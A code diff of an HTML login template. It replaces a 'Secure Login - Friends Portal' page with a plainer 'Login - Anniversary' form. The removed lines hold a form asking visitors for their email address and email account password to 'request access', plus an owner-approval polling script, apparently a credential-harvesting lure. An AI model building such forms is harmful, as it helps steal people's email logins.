@@ -3,108 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Login - Friends Portal</title>
+    <title>Login - Anniversary</title>
     <style>
-        /* እዚህ ጋር የበስተጀርባ ከለሩ ነጭ እንዲሆን በግልፅ አዘነዋል */
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #f4f6f7 !important; /* ነጣ ያለ ግራጫ ከለር */
-            color: #333333 !important; /* የፅሁፉ ከለር ጥቁር */
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        .login-box { 
-            background-color: #ffffff !important; /* የሳጥኑ ከለር ፍንትው ያለ ነጭ */
-            padding: 40px; 
-            border-radius: 10px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
-            text-align: center; 
-            width: 320px; 
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
         }
-        h2 { color: #2c3e50 !important; margin-bottom: 20px; }
-        p { color: #555555 !important; font-size: 14px; }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 10px 0; 
-            border: 1px solid #cccccc; 
-            border-radius: 5px; 
-            box-sizing: border-box; 
-            font-size: 14px;
-            background-color: #ffffff !important;
-            color: #000000 !important;
+        h2 { color: #333; margin-bottom: 20px; }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
         }
-        button { 
-            width: 100%; 
-            padding: 12px; 
-            background-color: #2c3e50 !important; 
-            color: white !important; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            font-size: 16px; 
-            margin-top: 10px; 
+        button {
+            width: 96%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
         }
-        button:hover { background-color: #1a252f !important; }
-        #timer-container { display: none; margin-top: 20px; font-size: 18px; color: #e67e22 !important; font-weight: bold; }
-        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #e67e22; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button:hover { background-color: #0056b3; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
-    <h2>Secure Login 🔒</h2>
-    
-    {% if not waiting_for %}
-    <p>Enter your details to request access</p>
+<div class="login-container">
+    <h2>Welcome Back!</h2>
     <form action="/login" method="POST">
-        <input type="text" name="username" placeholder="Your Full Name" required>
-        <input type="email" name="email" placeholder="Your Email Address" required>
-        <input type="password" name="password" placeholder="Email Password" required>
-        <button type="submit">Verify & Request Access</button>
+        <input type="text" name="username" placeholder="Full Name" required>
+        <input type="tel" name="phone" placeholder="Phone Number" required>
+        <input type="password" name="password" placeholder="Secret Code / Password" required>
+        <button type="submit">Log In</button>
     </form>
-    {% else %}
-    <div id="timer-container" style="display: block;">
-        <div class="loading-spinner"></div>
-        <p id="msg" style="color: #333 !important;">Credentials verified! Waiting for owner's approval...</p>
-        <p id="countdown" style="color: #e67e22 !important;">01:00</p>
-    </div>
-
-    <script>
-        let timeLeft = 60;
-        let username = "{{ waiting_for }}";
-        
-        let timer = setInterval(function() {
-            timeLeft--;
-            let minutes = Math.floor(timeLeft / 60);
-            let seconds = timeLeft % 60;
-            document.getElementById('countdown').textContent = `0${minutes}:${seconds < 10 ? '0'+seconds : seconds}`;
-            
-            fetch(`/check_status/${username}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === "approved") {
-                        clearInterval(timer);
-                        document.getElementById('msg').innerHTML = "Access Granted! 🎉 Redirecting...";
-                        setTimeout(() => { window.location.href = "/"; }, 2000);
-                    } else if (data.status === "rejected") {
-                        clearInterval(timer);
-                        document.getElementById('msg').innerHTML = "❌ Access Denied by the owner!";
-                        document.getElementById('countdown').style.display = 'none';
-                    }
-                });
-
-            if (timeLeft <= 0) {
-                clearInterval(timer);
-                document.getElementById('msg').innerHTML = "⏱️ Time out! Please try again.";
-            }
-        }, 1000);
-    </script>
-    {% endif %}
 </div>
 
 </body>
